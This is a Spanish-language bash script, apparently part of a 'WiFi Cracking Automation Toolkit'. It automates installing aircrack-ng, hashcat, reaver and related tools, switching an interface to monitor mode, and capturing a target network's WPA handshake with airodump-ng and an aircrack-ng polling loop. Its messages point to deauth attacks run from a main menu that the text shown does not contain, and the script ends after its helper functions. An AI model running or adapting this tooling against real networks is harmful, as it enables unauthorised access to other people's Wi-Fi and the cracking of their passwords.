#!/bin/bash

# Colores para el output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # Sin Color

# Directorio de trabajo predeterminado
WORK_DIR="$(pwd)/capturas"
mkdir -p "$WORK_DIR"

# Verificar permisos de root
function check_root() {
    if [ "$EUID" -ne 0 ]; then
      echo -e "${RED}[!] Por favor, ejecuta este script como root.${NC}"
      exit 1
    fi
}

# Función de limpieza (Trap)
function cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Interrupción detectada. Limpiando...${NC}"
    if [ ! -z "$mon_interface" ]; then
        if is_monitor_mode "$mon_interface"; then
             echo -e "${YELLOW}[*] Deteniendo modo monitor en $mon_interface...${NC}"
             airmon-ng stop "$mon_interface" > /dev/null 2>&1
        fi
    fi
    
    # Limpiar archivos de captura incompletos si es necesario
    if [ "$HANDSHAKE_CAPTURED" == "0" ] && [ ! -z "$full_cap_path" ]; then
        echo -e "${YELLOW}[*] Eliminando archivos de captura abortada...${NC}"
        rm -f "${full_cap_path}"*
    fi
    echo -e "${YELLOW}[*] Restaurando servicios de red...${NC}"
    service NetworkManager restart
    echo -e "${GREEN}[+] Salida limpia completada.${NC}"
    exit 0
}

# Capturar señales de salida (Ctrl+C, Exit)
trap cleanup SIGINT EXIT

function banner() {
    clear
    echo -e "${GREEN}"
    echo "  ╭─────────────────────────────────────────────────────╮"
    echo "  │  WiFi Cracking Automation Toolkit                   │"
    echo "  │  Dev by: Lukas Otero                                │"
    echo "  ╰─────────────────────────────────────────────────────╯"
    echo -e "${NC}"
}

function show_loader() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    echo -ne " "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

function check_dependencies() {
    clear
    echo -e "${YELLOW}[*] Verificando dependencias del sistema...${NC}"
    echo "========================================="
    
    # Lista de herramientas críticas y sus paquetes correspondientes
    # Formato: "herramienta:paquete"
    dependencies=(
        "airmon-ng:aircrack-ng"
        "airodump-ng:aircrack-ng"
        "aireplay-ng:aircrack-ng"
        "aircrack-ng:aircrack-ng"
        "hashcat:hashcat"
        "iwconfig:wireless-tools"
        "iw:iw"
        "wget:wget"
        "wash:reaver"
        "bully:bully"
        "hcxdumptool:hcxtools"
        "macchanger:macchanger"
        "cowpatty:cowpatty"
    )

    for item in "${dependencies[@]}"; do
        tool="${item%%:*}"
        package="${item##*:}"

        if ! command -v "$tool" &> /dev/null; then
            echo -e "${RED}[!] La herramienta '$tool' no está instalada.${NC}"
            read -p "¿Deseas instalar el paquete '$package'? [S/n]: " choice
            choice=${choice:-S}
            
            if [[ "$choice" == "s" || "$choice" == "S" ]]; then
                echo -e "${YELLOW}[*] Actualizando e instalando $package...${NC}"
                apt-get update && apt-get install -y "$package"
                if ! command -v "$tool" &> /dev/null; then
                    echo -e "${RED}[!] Falló la instalación de $package. Saliendo...${NC}"
                    exit 1
                fi
                echo -e "${GREEN}[+] $package instalado correctamente.${NC}"
            else
                echo -e "${RED}[!] Se requiere '$tool' para continuar. Saliendo...${NC}"
                exit 1
            fi
        else
            echo -e "${GREEN}[OK] $tool encontrado.${NC}"
        fi
    done

    # Verificación opcional para hcxtools
    if ! command -v hcxpcapngtool &> /dev/null; then
        echo -e "${YELLOW}[INFO] 'hcxpcapngtool' no encontrado (útil para convertir .cap a hashcat).${NC}"
        read -p "¿Deseas instalar 'hcxtools' (opcional)? (s/n): " choice
        if [[ "$choice" == "s" || "$choice" == "S" ]]; then
             apt-get update && apt-get install -y hcxtools
        fi
    else
        echo -e "${GREEN}[OK] hcxpcapngtool encontrado.${NC}"
    fi

    echo -e "${GREEN}[*] Todas las dependencias están listas.${NC}"
    sleep 2
}

function check_monitor_support() {
    local iface=$1
    if [ -z "$iface" ]; then return; fi

    echo -e "${YELLOW}[*] Verificando soporte de modo monitor para $iface...${NC}"

    # Obtener índice PHY
    local output=$(iw dev "$iface" info 2>/dev/null)
    local phy=$(echo "$output" | grep "wiphy" | awk '{print $2}')

    if [ -z "$phy" ]; then
        echo -e "${RED}[!] No se pudo obtener información del hardware para $iface.${NC}"
        # No bloqueamos, solo avisamos
        return
    fi

    # Verificar soporte en el hardware físico
    if iw phy "phy$phy" info 2>/dev/null | grep -q "monitor"; then
        echo -e "${GREEN}[OK] La interfaz soporta modo monitor.${NC}"
    else
        echo -e "${RED}[!] ALERTA: La interfaz '$iface' NO parece soportar modo monitor.${NC}"
        echo -e "${YELLOW}[!] Sin esto, el script fallará.${NC}"
        read -p "¿Deseas continuar de todos modos? (s/n): " choice
        if [[ "$choice" != "s" && "$choice" != "S" ]]; then exit 1; fi
    fi
}

function run_in_new_terminal() {
    local cmd="$1"
    local title="$2"
    local bssid="$3"
    local cap_path="$4"
    
    echo -e "${YELLOW}[*] Abriendo ventana auxiliar para: $title...${NC}"
    
    # Crear script wrapper temporal que auto-cierra cuando se captura el handshake
    local wrapper_script="/tmp/airodump_wrapper_$$.sh"
    
    cat > "$wrapper_script" << 'WRAPPER_EOF'
#!/bin/bash

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

CMD="$1"
BSSID="$2"
CAP_PATH="$3"

# Banner informativo
clear
echo ""
echo -e "${CYAN}  ╭─────────────────────────────────────────────────────╮${NC}"
echo -e "${CYAN}  │${NC}  ${GREEN}●${NC} Captura de Handshake en Progreso                ${CYAN}│${NC}"
echo -e "${CYAN}  ╰─────────────────────────────────────────────────────╯${NC}"
echo ""

# Leer parámetros desde variables de entorno
CMD="$AIRODUMP_CMD"
BSSID="$AIRODUMP_BSSID"
CAP_PATH="$AIRODUMP_CAP_PATH"

# DEBUG: Verificar parámetros recibidos
if [ -z "$CMD" ] || [ -z "$BSSID" ] || [ -z "$CAP_PATH" ]; then
    echo -e "${RED}[!] ERROR: Variables de entorno faltantes${NC}"
    echo "AIRODUMP_CMD: '$CMD'"
    echo "AIRODUMP_BSSID: '$BSSID'"
    echo "AIRODUMP_CAP_PATH: '$CAP_PATH'"
    echo ""
    echo -e "${YELLOW}[*] Presiona Enter para cerrar...${NC}"
    read
    exit 1
fi

# Trap para manejar SIGTERM del monitor cuando se captura handshake
trap 'exit 0' TERM

echo -e "  ${YELLOW}Target:${NC} $BSSID"
echo ""
echo -e "  ${CYAN}ℹ${NC}  Esta ventana se cerrará automáticamente al capturar"
echo -e "  ${CYAN}ℹ${NC}  Ejecuta ataques deauth desde el menú principal"
echo -e "  ${CYAN}ℹ${NC}  Si no se captura, el programa NO está trabado"
echo ""
echo -e "${YELLOW}[*]${NC} Iniciando airodump-ng..."
echo ""

# Función para verificar handshake en background
check_handshake_loop() {
    local bssid="$1"
    local cap_path="$2"
    local wrapper_pid="$3"
    local min_wait=3
    local counter=0
    local log_file="/tmp/handshake_monitor_$wrapper_pid.log"
    
    echo "[$(date +%H:%M:%S)] Monitor iniciado. BSSID=$bssid, CAP=$cap_path, PID=$wrapper_pid" > "$log_file"
    
    # Espera inicial antes de empezar a verificar
    sleep 9
    echo "[$(date +%H:%M:%S)] Espera inicial completada" >> "$log_file"
    
    while true; do
        sleep 3
        counter=$((counter + 1))
        
        # Buscar archivo de captura
        local cap_file=""
        if [ -f "${cap_path}-01.cap" ]; then
            cap_file="${cap_path}-01.cap"
        elif [ -f "${cap_path}.cap" ]; then
            cap_file="${cap_path}.cap"
        fi
        
        echo "[$(date +%H:%M:%S)] Verificación #$counter - Archivo: $cap_file" >> "$log_file"
        
        # Verificar handshake si existe el archivo
        if [ ! -z "$cap_file" ] && [ -f "$cap_file" ] && [ -s "$cap_file" ]; then
            # SINCRONIZAR DISCO Y TRABAJAR SOBRE COPIA
            # Esto evita problemas de lectura en archivos abiertos
            sync
            cp -f "$cap_file" "/tmp/check_$wrapper_pid.cap" 2>/dev/null
            
            echo "[$(date +%H:%M:%S)] Verificando copia temporal: /tmp/check_$wrapper_pid.cap" >> "$log_file"
            
            # Ejecutar aircrack-ng sobre la copia
            local aircrack_output=$(timeout 5 aircrack-ng -b "$bssid" "/tmp/check_$wrapper_pid.cap" 2>&1)
            
            # Limpiar copia
            rm -f "/tmp/check_$wrapper_pid.cap" 2>/dev/null
            
            echo "$aircrack_output" >> "$log_file"
            
            # Buscar handshake de múltiples formas (case-insensitive)
            if echo "$aircrack_output" | grep -qi "handshake"; then
                echo "[$(date +%H:%M:%S)] ¡HANDSHAKE DETECTADO!" >> "$log_file"
                
                # Handshake detectado - matar airodump
                echo "[$(date +%H:%M:%S)] Matando airodump..." >> "$log_file"
                pkill -f "airodump-ng.*$bssid" 2>/dev/null
                sleep 1
                
                # Si aún está vivo, usar kill más agresivo
                if pgrep -f "airodump-ng.*$bssid" > /dev/null; then
                    echo "[$(date +%H:%M:%S)] Airodump aún vivo, usando kill -9..." >> "$log_file"
                    pkill -9 -f "airodump-ng.*$bssid" 2>/dev/null
                    sleep 1
                fi
                
                # Crear archivo de señal
                echo "[$(date +%H:%M:%S)] Creando archivo de señal..." >> "$log_file"
                touch "/tmp/handshake_captured_$wrapper_pid.flag"
                
                echo "[$(date +%H:%M:%S)] Handshake capturado, airodump muerto, señal creada" >> "$log_file"
                echo "[$(date +%H:%M:%S)] El script principal detectará la señal y cerrará" >> "$log_file"
                
                # Terminar el monitor
                exit 0
            else
                echo "[$(date +%H:%M:%S)] No se detectó handshake" >> "$log_file"
            fi
        else
            echo "[$(date +%H:%M:%S)] Archivo no existe o está vacío" >> "$log_file"
        fi
    done
}


# Capturar PID del wrapper ANTES de lanzar función en background
WRAPPER_PID=$$

# Iniciar monitoreo de handshake en background
check_handshake_loop "$BSSID" "$CAP_PATH" "$WRAPPER_PID" &
MONITOR_PID=$!

# Ejecutar airodump en FOREGROUND (para que se vea la salida)
eval "$CMD"
AIRODUMP_EXIT=$?

# Si airodump termina, matar el monitor
kill $MONITOR_PID 2>/dev/null
wait $MONITOR_PID 2>/dev/null

# Verificar si el monitor capturó el handshake
if [ -f "/tmp/handshake_captured_$WRAPPER_PID.flag" ]; then
    # El handshake fue capturado - mostrar mensaje de éxito
    clear
    echo ""
    echo -e "${GREEN}  ╭─────────────────────────────────────────────────────╮${NC}"
    echo -e "${GREEN}  │${NC}  ${GREEN}✓${NC} Handshake Capturado Exitosamente                 ${GREEN}│${NC}"
    echo -e "${GREEN}  ╰─────────────────────────────────────────────────────╯${NC}"
    echo ""
    echo -e "${YELLOW}[*]${NC} Deteniendo captura..."
    echo -e "${GREEN}[+]${NC} Proceso finalizado correctamente"
    echo -e "${CYAN}[*]${NC} Esta ventana se cerrará en 3 segundos..."
    sleep 3
    
    # Limpiar y salir
    rm -f "/tmp/handshake_captured_$WRAPPER_PID.flag" 2>/dev/null
    exit 0
fi

# Verificar por qué terminó airodump
if [ $AIRODUMP_EXIT -ne 0 ]; then
    echo ""
    echo -e "${RED}[!] Error: airodump-ng terminó con código de error $AIRODUMP_EXIT${NC}"
    echo -e "${YELLOW}[*] Verifica que la interfaz esté en modo monitor${NC}"
    echo ""
    echo -e "${YELLOW}[*] Presiona Enter para cerrar...${NC}"
    read
    exit 1
fi

# Si llegamos aquí, airodump terminó normalmente (usuario presionó Ctrl+C)
echo ""
echo -e "${YELLOW}[*] Captura detenida por el usuario${NC}"
echo -e "${YELLOW}[*] Presiona Enter para cerrar...${NC}"
read
WRAPPER_EOF

    chmod +x "$wrapper_script"
    
    # Exportar parámetros como variables de entorno para evitar problemas de escape
    export AIRODUMP_CMD="$cmd"
    export AIRODUMP_BSSID="$bssid"
    export AIRODUMP_CAP_PATH="$cap_path"
    
    # El wrapper leerá las variables de entorno directamente
    local full_cmd="$wrapper_script"
    
    # Intentar detectar emuladores de terminal comunes en Kali/Linux
    if command -v x-terminal-emulator > /dev/null 2>&1; then
        x-terminal-emulator -e "$wrapper_script" &
    elif command -v qterminal > /dev/null 2>&1; then
        qterminal -e "$wrapper_script" &
    elif command -v gnome-terminal > /dev/null 2>&1; then
        gnome-terminal -- "$wrapper_script" &
    elif command -v xfce4-terminal > /dev/null 2>&1; then
        xfce4-terminal -e "$wrapper_script" &
    elif command -v xterm > /dev/null 2>&1; then
        xterm -title "$title" -e "$wrapper_script" &
    else
        echo -e "${RED}[!] No se pudo abrir una nueva terminal automáticamente.${NC}"
        echo -e "${YELLOW}[*] Ejecutando en segundo plano (background)...${NC}"
        eval "$cmd" &
    fi
    
    # Limpiar script wrapper después de 10 segundos (dar tiempo suficiente)
    (sleep 10; rm -f "$wrapper_script" 2>/dev/null) &
}

function get_wireless_interfaces() {
    iw dev | grep Interface | awk '{print $2}'
}

function is_monitor_mode() {
    local iface=$1
    if iw dev "$iface" info &>/dev/null; then
        iw dev "$iface" info | grep -q "type monitor"
    else
        return 1
    fi
}

function ensure_mon_interface() {
    if [ ! -z "$mon_interface" ] && is_monitor_mode "$mon_interface"; then
        return 0
    fi

    echo -e "${YELLOW}[*] Buscando interfaz en modo monitor...${NC}"
    
    for iface in $(get_wireless_interfaces); do
        if is_monitor_mode "$iface"; then
            mon_interface="$iface"
            echo -e "${GREEN}[+] Interfaz monitor detectada automáticamente: $mon_interface${NC}"
            return 0
        fi
    done
    
    echo -e "${YELLOW}[*] No se detectó modo monitor. Intentando activar automáticamente...${NC}"
    for iface in $(get_wireless_interfaces); do
        echo -e "${YELLOW}[*] Activando airmon-ng en $iface...${NC}"
        
        airmon-ng check kill > /dev/null 2>&1
        
        airmon-ng start "$iface" > /dev/null 2>&1 &
        show_loader $!
        
        for new_iface in $(get_wireless_interfaces); do
            if is_monitor_mode "$new_iface"; then
                mon_interface="$new_iface"
                echo -e "\n${GREEN}[+] Modo monitor iniciado correctamente en: $mon_interface${NC}"
                return 0
            fi
        done
    done
    
    echo -e "${RED}[!] No se pudo activar automáticamente.${NC}"
    read -p "Ingresa el nombre de la interfaz en modo monitor (ej. wlan0mon): " mon_interface
}




